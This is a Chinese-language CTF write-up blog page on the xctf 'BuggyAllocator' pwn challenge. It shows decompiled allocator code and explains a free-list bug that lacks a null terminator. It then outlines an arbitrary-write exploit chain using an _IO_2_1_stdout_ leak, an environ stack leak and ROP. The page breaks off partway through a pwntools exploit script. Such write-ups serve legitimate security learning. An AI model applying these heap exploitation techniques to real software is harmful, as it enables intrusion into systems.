<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>xctf_BuggyAllocator复现 | nyyyddddn</title>
  <meta name="author" content="nyyyddddn">
  
  <meta name="description" content="xctf_BuggyAllocator复现程序有 alloc 和dealloc两个选项
__int64 menu()
&amp;#123;
  __int64 v0; // rax
  __int64 v1; // rax
  __int64 v2; // rax

  v0 = std::operator&amp;lt;&amp;lt;&amp;lt;std::char_traits&amp;lt;char&gt;&gt;(&amp;amp;std::cout, &#34;*** Buggy  Allocator***&#34;);
  std::ostream::operator&amp;lt;&amp;lt;(v0, &amp;amp;std::endl&amp;lt;char,std::char_traits&amp;lt;char&gt;&gt;);
  v1 = std::operator&amp;lt;&amp;lt;&amp;lt;std::char_traits&amp;lt;char&gt;&gt;(&amp;amp;std::cout, &#34;***     1. Alloc    ***&#34;);
  std::ostream::operator&amp;lt;&amp;lt;(v1, &amp;amp;std::endl&amp;lt;char,std::char_traits&amp;lt;char&gt;&gt;);
  v2 = std::operator&amp;lt;&amp;lt;&amp;lt;std::char_traits&amp;lt;char&gt;&gt;(&amp;amp;std::cout, &#34;***     2. Dealloc  ***&#34;);
  std::ostream::operator&amp;lt;&amp;lt;(v2, &amp;amp;std::endl&amp;lt;char,std::char_traits&amp;lt;char&gt;&gt;);
  return std::operator&amp;lt;&amp;lt;&amp;lt;std::char_traits&amp;lt;char&gt;&gt;(&amp;amp;std::cout, &#34;&gt; &#34;);
&amp;#125;

void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
&amp;#123;
  __int64 v3; // rax
  int choice; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v5; // [rsp+8h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  sub_4019D7(a1, a2, a3);
  while ( 1 )
  &amp;#123;
    while ( 1 )
    &amp;#123;
      menu();
      std::istream::operator&gt;&gt;(&amp;amp;std::cin, &amp;amp;choice);
      if ( choice != 1 )
        break;
      add();
    &amp;#125;
    if ( choice != 2 )
    &amp;#123;
      v3 = std::operator&amp;lt;&amp;lt;&amp;lt;std::char_traits&amp;lt;char&gt;&gt;(&amp;amp;std::cout, &#34;Invalid Choice&#34;);
      std::ostream::operator&amp;lt;&amp;lt;(v3, &amp;amp;std::endl&amp;lt;char,std::char_traits&amp;lt;char&gt;&gt;);
      exit(0);
    &amp;#125;
    delete();
  &amp;#125;
&amp;#125;

，其中alloc申请大于 0x80 会使用malloc函数分配内存(ptmalloc2)，小于等于 0x80会使用自定义的堆管理器去分配内存
_QWORD *__fastcall alloc_memory(size_t size)
&amp;#123;
  __int64 v2; &amp;#x2F;&amp;#x2F; rax
  _QWORD **v3; &amp;#x2F;&amp;#x2F; [rsp+18h] [rbp-18h]
  _QWORD *v4; &amp;#x2F;&amp;#x2F; [rsp+20h] [rbp-10h]

  if ( !size )
    return 0LL;
  if ( size &amp;gt; 0x80 )
    return malloc_(size);
  v3 &amp;#x3D; (_QWORD **)&amp;amp;free_list[get_idx(size)];
  v4 &amp;#x3D; *v3;
  if ( *v3 )
  &amp;#123;
    *v3 &amp;#x3D; (_QWORD *)*v4;
    return v4;
  &amp;#125;
  else
  &amp;#123;
    v2 &amp;#x3D; Alignment_size(size);
    return refill(v2);
  &amp;#125;
&amp;#125;

自定义的堆管理器维护一个free_list，申请内存的时候，当free list中没有申请大小的堆块时，就会调用refill 填充空闲区域(arena_end - arena_start)，填充完后free list中拿，当空闲区域不够refill的时候会判断free list中有没有更大的堆块可以进行refill，如果都不满足会调用malloc申请名称
_QWORD *__fastcall refill(unsigned __int64 size)
&amp;#123;
  int nobjs; &amp;#x2F;&amp;#x2F; [rsp+18h] [rbp-38h] BYREF
  int i; &amp;#x2F;&amp;#x2F; [rsp+1Ch] [rbp-34h]
  _QWORD *current_obj; &amp;#x2F;&amp;#x2F; [rsp+20h] [rbp-30h]
  _QWORD *v5; &amp;#x2F;&amp;#x2F; [rsp+28h] [rbp-28h]
  _QWORD *my_free_list; &amp;#x2F;&amp;#x2F; [rsp+30h] [rbp-20h]
  _QWORD *v7; &amp;#x2F;&amp;#x2F; [rsp+38h] [rbp-18h]
  _QWORD *next_obj; &amp;#x2F;&amp;#x2F; [rsp+40h] [rbp-10h]
  unsigned __int64 v9; &amp;#x2F;&amp;#x2F; [rsp+48h] [rbp-8h]

  v9 &amp;#x3D; __readfsqword(0x28u);
  nobjs &amp;#x3D; 20;
  v5 &amp;#x3D; (_QWORD *)chunk_alloc(size, &amp;amp;nobjs);
  if ( nobjs &amp;#x3D;&amp;#x3D; 1 )
    return v5;
  my_free_list &amp;#x3D; &amp;amp;free_list[get_idx(size)];
  v7 &amp;#x3D; v5;
  current_obj &amp;#x3D; v5;
  *my_free_list &amp;#x3D; (char *)v5 + size;
  for ( i &amp;#x3D; 0; i !&amp;#x3D; nobjs - 1; ++i )
  &amp;#123;
    next_obj &amp;#x3D; (_QWORD *)((char *)current_obj + size);
    *current_obj &amp;#x3D; (char *)current_obj + size;
    current_obj &amp;#x3D; next_obj;
  &amp;#125;
  return v7;
&amp;#125;

_QWORD *__fastcall chunk_alloc(unsigned __int64 size, int *nobjs)
&amp;#123;
  unsigned __int64 idx; &amp;#x2F;&amp;#x2F; rax
  int i; &amp;#x2F;&amp;#x2F; [rsp+14h] [rbp-3Ch]
  unsigned __int64 all_size; &amp;#x2F;&amp;#x2F; [rsp+18h] [rbp-38h]
  unsigned __int64 available_size; &amp;#x2F;&amp;#x2F; [rsp+20h] [rbp-30h]
  _QWORD *arena_start_ptr; &amp;#x2F;&amp;#x2F; [rsp+28h] [rbp-28h]
  size_t v8; &amp;#x2F;&amp;#x2F; [rsp+38h] [rbp-18h]
  _QWORD **v9; &amp;#x2F;&amp;#x2F; [rsp+40h] [rbp-10h]
  _QWORD *v10; &amp;#x2F;&amp;#x2F; [rsp+48h] [rbp-8h]

  all_size &amp;#x3D; size * *nobjs;
  available_size &amp;#x3D; arena_end - arena_start;
  arena_start_ptr &amp;#x3D; (_QWORD *)arena_start;
  if ( all_size &amp;gt; arena_end - arena_start )
  &amp;#123;
    if ( available_size &amp;lt; size )
    &amp;#123;
      if ( available_size )
      &amp;#123;
        arena_start &amp;#x3D; arena_end;
        idx &amp;#x3D; get_idx(available_size);
        *arena_start_ptr &amp;#x3D; free_list[idx];
        free_list[idx] &amp;#x3D; arena_start_ptr;
      &amp;#125;
      v8 &amp;#x3D; 2 * all_size;
      for ( i &amp;#x3D; size; i &amp;lt;&amp;#x3D; 128; i +&amp;#x3D; 8 )
      &amp;#123;
        v9 &amp;#x3D; (_QWORD **)&amp;amp;free_list[get_idx(i)];
        v10 &amp;#x3D; *v9;
        if ( *v9 )
        &amp;#123;
          *v9 &amp;#x3D; (_QWORD *)*v10;
          arena_start &amp;#x3D; (__int64)v10;
          arena_end &amp;#x3D; (__int64)v10 + i;
          return chunk_alloc(size, nobjs);
        &amp;#125;
      &amp;#125;
      arena_end &amp;#x3D; 0LL;
      arena_start &amp;#x3D; (__int64)malloc_(v8);
      arena_end &amp;#x3D; arena_start + v8;
      return chunk_alloc(size, nobjs);
    &amp;#125;
    else
    &amp;#123;
      *nobjs &amp;#x3D; available_size &amp;#x2F; size;
      arena_start +&amp;#x3D; size * *nobjs;
      return arena_start_ptr;
    &amp;#125;
  &amp;#125;
  else
  &amp;#123;
    arena_start +&amp;#x3D; all_size;
    return arena_start_ptr;
  &amp;#125;
&amp;#125;

存在漏洞的地方是建立链表的时候不会将最后一个obj的next指针置空，可以通过堆块上残留的数据伪造一个指针破坏链表，实现任意地址分配
for ( i &amp;#x3D; 0; i !&amp;#x3D; nobjs - 1; ++i )
&amp;#123;
  next_obj &amp;#x3D; (_QWORD *)((char *)current_obj + size);
  *current_obj &amp;#x3D; (char *)current_obj + size;
  current_obj &amp;#x3D; next_obj;
&amp;#125;

利用的思路是，首先申请大量的堆块，使arena_end - arena_start尽可能的小，这样申请小块内存的时候,建立freelist,会优先从free list中的大堆块中建立，而不是从后面空闲内存那建立，利用大堆块中残留的数据伪造next指针破坏freelist实现任意地址写，写IO_2_1_stdout 通过puts的利用链将libc的地址泄露出来后，再通过environ泄露栈地址，最后写rop"> 
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="xctf_BuggyAllocator复现"/>
  <meta property="og:site_name" content="nyyyddddn"/>

  
    <meta property="og:image" content=""/>
  

  
    <link rel="alternative" href="/atom.xml" title="nyyyddddn" type="application/atom+xml">
  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  




<meta name="generator" content="Hexo 6.3.0"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">nyyyddddn</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class=""></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/catergories" title="All the categories.">
			  <i class=""></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="All the tags.">
			  <i class=""></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class=""></i>About
			</a>
		  </li>
		  
		  <li>
			<a href="/atom.xml" title="Subscribe me.">
			  <i class=""></i>RSS
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> xctf_BuggyAllocator复现</h1>
		</div>
	



<div class="row post">
	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  		

	  <h2 id="xctf-BuggyAllocator复现"><a href="#xctf-BuggyAllocator复现" class="headerlink" title="xctf_BuggyAllocator复现"></a>xctf_BuggyAllocator复现</h2><p>程序有 alloc 和dealloc两个选项</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  __int64 v0<span class="token punctuation">;</span> <span class="token comment">// rax</span>
  __int64 v1<span class="token punctuation">;</span> <span class="token comment">// rax</span>
  __int64 v2<span class="token punctuation">;</span> <span class="token comment">// rax</span>

  v0 <span class="token operator">=</span> std<span class="token operator">::</span>operator<span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span><span class="token punctuation">(</span><span class="token operator">&amp;</span>std<span class="token operator">::</span>cout<span class="token punctuation">,</span> <span class="token string">"*** Buggy  Allocator***"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  std<span class="token operator">::</span>ostream<span class="token operator">::</span>operator<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>v0<span class="token punctuation">,</span> <span class="token operator">&amp;</span>std<span class="token operator">::</span>endl<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token punctuation">,</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v1 <span class="token operator">=</span> std<span class="token operator">::</span>operator<span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span><span class="token punctuation">(</span><span class="token operator">&amp;</span>std<span class="token operator">::</span>cout<span class="token punctuation">,</span> <span class="token string">"***     1. Alloc    ***"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  std<span class="token operator">::</span>ostream<span class="token operator">::</span>operator<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>std<span class="token operator">::</span>endl<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token punctuation">,</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v2 <span class="token operator">=</span> std<span class="token operator">::</span>operator<span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span><span class="token punctuation">(</span><span class="token operator">&amp;</span>std<span class="token operator">::</span>cout<span class="token punctuation">,</span> <span class="token string">"***     2. Dealloc  ***"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  std<span class="token operator">::</span>ostream<span class="token operator">::</span>operator<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>v2<span class="token punctuation">,</span> <span class="token operator">&amp;</span>std<span class="token operator">::</span>endl<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token punctuation">,</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> std<span class="token operator">::</span>operator<span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span><span class="token punctuation">(</span><span class="token operator">&amp;</span>std<span class="token operator">::</span>cout<span class="token punctuation">,</span> <span class="token string">"> "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> __fastcall __noreturn <span class="token function">main</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  __int64 v3<span class="token punctuation">;</span> <span class="token comment">// rax</span>
  <span class="token keyword">int</span> choice<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-Ch] BYREF</span>
  <span class="token keyword">unsigned</span> __int64 v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-8h]</span>

  v5 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sub_4019D7</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> a2<span class="token punctuation">,</span> a3<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      std<span class="token operator">::</span>istream<span class="token operator">::</span>operator<span class="token operator">>></span><span class="token punctuation">(</span><span class="token operator">&amp;</span>std<span class="token operator">::</span>cin<span class="token punctuation">,</span> <span class="token operator">&amp;</span>choice<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> choice <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> choice <span class="token operator">!=</span> <span class="token number">2</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      v3 <span class="token operator">=</span> std<span class="token operator">::</span>operator<span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span><span class="token punctuation">(</span><span class="token operator">&amp;</span>std<span class="token operator">::</span>cout<span class="token punctuation">,</span> <span class="token string">"Invalid Choice"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      std<span class="token operator">::</span>ostream<span class="token operator">::</span>operator<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>v3<span class="token punctuation">,</span> <span class="token operator">&amp;</span>std<span class="token operator">::</span>endl<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token punctuation">,</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>，其中alloc申请大于 0x80 会使用malloc函数分配内存(ptmalloc2)，小于等于 0x80会使用自定义的堆管理器去分配内存</p>
<pre class="line-numbers language-none"><code class="language-none">_QWORD *__fastcall alloc_memory(size_t size)
&#123;
  __int64 v2; &#x2F;&#x2F; rax
  _QWORD **v3; &#x2F;&#x2F; [rsp+18h] [rbp-18h]
  _QWORD *v4; &#x2F;&#x2F; [rsp+20h] [rbp-10h]

  if ( !size )
    return 0LL;
  if ( size &gt; 0x80 )
    return malloc_(size);
  v3 &#x3D; (_QWORD **)&amp;free_list[get_idx(size)];
  v4 &#x3D; *v3;
  if ( *v3 )
  &#123;
    *v3 &#x3D; (_QWORD *)*v4;
    return v4;
  &#125;
  else
  &#123;
    v2 &#x3D; Alignment_size(size);
    return refill(v2);
  &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>自定义的堆管理器维护一个free_list，申请内存的时候，当free list中没有申请大小的堆块时，就会调用refill 填充空闲区域(arena_end - arena_start)，填充完后free list中拿，当空闲区域不够refill的时候会判断free list中有没有更大的堆块可以进行refill，如果都不满足会调用malloc申请名称</p>
<pre class="line-numbers language-none"><code class="language-none">_QWORD *__fastcall refill(unsigned __int64 size)
&#123;
  int nobjs; &#x2F;&#x2F; [rsp+18h] [rbp-38h] BYREF
  int i; &#x2F;&#x2F; [rsp+1Ch] [rbp-34h]
  _QWORD *current_obj; &#x2F;&#x2F; [rsp+20h] [rbp-30h]
  _QWORD *v5; &#x2F;&#x2F; [rsp+28h] [rbp-28h]
  _QWORD *my_free_list; &#x2F;&#x2F; [rsp+30h] [rbp-20h]
  _QWORD *v7; &#x2F;&#x2F; [rsp+38h] [rbp-18h]
  _QWORD *next_obj; &#x2F;&#x2F; [rsp+40h] [rbp-10h]
  unsigned __int64 v9; &#x2F;&#x2F; [rsp+48h] [rbp-8h]

  v9 &#x3D; __readfsqword(0x28u);
  nobjs &#x3D; 20;
  v5 &#x3D; (_QWORD *)chunk_alloc(size, &amp;nobjs);
  if ( nobjs &#x3D;&#x3D; 1 )
    return v5;
  my_free_list &#x3D; &amp;free_list[get_idx(size)];
  v7 &#x3D; v5;
  current_obj &#x3D; v5;
  *my_free_list &#x3D; (char *)v5 + size;
  for ( i &#x3D; 0; i !&#x3D; nobjs - 1; ++i )
  &#123;
    next_obj &#x3D; (_QWORD *)((char *)current_obj + size);
    *current_obj &#x3D; (char *)current_obj + size;
    current_obj &#x3D; next_obj;
  &#125;
  return v7;
&#125;

_QWORD *__fastcall chunk_alloc(unsigned __int64 size, int *nobjs)
&#123;
  unsigned __int64 idx; &#x2F;&#x2F; rax
  int i; &#x2F;&#x2F; [rsp+14h] [rbp-3Ch]
  unsigned __int64 all_size; &#x2F;&#x2F; [rsp+18h] [rbp-38h]
  unsigned __int64 available_size; &#x2F;&#x2F; [rsp+20h] [rbp-30h]
  _QWORD *arena_start_ptr; &#x2F;&#x2F; [rsp+28h] [rbp-28h]
  size_t v8; &#x2F;&#x2F; [rsp+38h] [rbp-18h]
  _QWORD **v9; &#x2F;&#x2F; [rsp+40h] [rbp-10h]
  _QWORD *v10; &#x2F;&#x2F; [rsp+48h] [rbp-8h]

  all_size &#x3D; size * *nobjs;
  available_size &#x3D; arena_end - arena_start;
  arena_start_ptr &#x3D; (_QWORD *)arena_start;
  if ( all_size &gt; arena_end - arena_start )
  &#123;
    if ( available_size &lt; size )
    &#123;
      if ( available_size )
      &#123;
        arena_start &#x3D; arena_end;
        idx &#x3D; get_idx(available_size);
        *arena_start_ptr &#x3D; free_list[idx];
        free_list[idx] &#x3D; arena_start_ptr;
      &#125;
      v8 &#x3D; 2 * all_size;
      for ( i &#x3D; size; i &lt;&#x3D; 128; i +&#x3D; 8 )
      &#123;
        v9 &#x3D; (_QWORD **)&amp;free_list[get_idx(i)];
        v10 &#x3D; *v9;
        if ( *v9 )
        &#123;
          *v9 &#x3D; (_QWORD *)*v10;
          arena_start &#x3D; (__int64)v10;
          arena_end &#x3D; (__int64)v10 + i;
          return chunk_alloc(size, nobjs);
        &#125;
      &#125;
      arena_end &#x3D; 0LL;
      arena_start &#x3D; (__int64)malloc_(v8);
      arena_end &#x3D; arena_start + v8;
      return chunk_alloc(size, nobjs);
    &#125;
    else
    &#123;
      *nobjs &#x3D; available_size &#x2F; size;
      arena_start +&#x3D; size * *nobjs;
      return arena_start_ptr;
    &#125;
  &#125;
  else
  &#123;
    arena_start +&#x3D; all_size;
    return arena_start_ptr;
  &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>存在漏洞的地方是建立链表的时候不会将最后一个obj的next指针置空，可以通过堆块上残留的数据伪造一个指针破坏链表，实现任意地址分配</p>
<pre class="line-numbers language-none"><code class="language-none">for ( i &#x3D; 0; i !&#x3D; nobjs - 1; ++i )
&#123;
  next_obj &#x3D; (_QWORD *)((char *)current_obj + size);
  *current_obj &#x3D; (char *)current_obj + size;
  current_obj &#x3D; next_obj;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>利用的思路是，首先申请大量的堆块，使arena_end - arena_start尽可能的小，这样申请小块内存的时候,建立freelist,会优先从free list中的大堆块中建立，而不是从后面空闲内存那建立，利用大堆块中残留的数据伪造next指针破坏freelist实现任意地址写，写IO_2_1_stdout 通过puts的利用链将libc的地址泄露出来后，再通过environ泄露栈地址，最后写rop</p>
<p>关于puts函数泄露任意地址 IO_2_1_stdout利用链的分析</p>
<p><a target="_blank" rel="noopener" href="https://a1ex.online/2020/08/31/IO-FILE%E6%B3%84%E9%9C%B2libc%E5%9C%B0%E5%9D%80/">https://a1ex.online/2020/08/31/IO-FILE%E6%B3%84%E9%9C%B2libc%E5%9C%B0%E5%9D%80/</a></p>
<p>简单来说 当 write_ptr &gt; write_base时 ，会将write_base这个地址中大小为 (write_ptr - write_base)的数据泄露出来，</p>
<p>其中flag要为特定值才能绕过前面几个cmp，write_end要小于等于 write_ptr</p>
<p>exp</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>

is_debug <span class="token operator">=</span> <span class="token number">1</span>
IP <span class="token operator">=</span> <span class="token string">"47.100.139.115"</span>
PORT <span class="token operator">=</span> <span class="token number">30708</span>

elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

<span class="token keyword">def</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> remote<span class="token punctuation">(</span>IP<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token keyword">not</span> is_debug <span class="token keyword">else</span> process<span class="token punctuation">(</span><span class="token punctuation">)</span>

p <span class="token operator">=</span> connect<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">alloc</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'idx'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'size'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'Content'</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">dealloc</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'idx'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>



stdout_addr <span class="token operator">=</span> <span class="token number">0x404040</span>
alloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x38</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>stdout_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x40</span><span class="token punctuation">)</span>
alloc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x40</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xDEADBEAF</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x38</span><span class="token punctuation">)</span>

<span class="token comment">#清空0x80的freelist 使得 arena_end - arena_start &lt; 0x38 这样申请内存就会从0x80的free list中切割然后拿了</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    alloc<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token operator">*</span><span class="token number">0x80</span><span class="token punctuation">)</span>

<span class="token comment">#释放一个0x80堆块用来建立0x38的freelist</span>
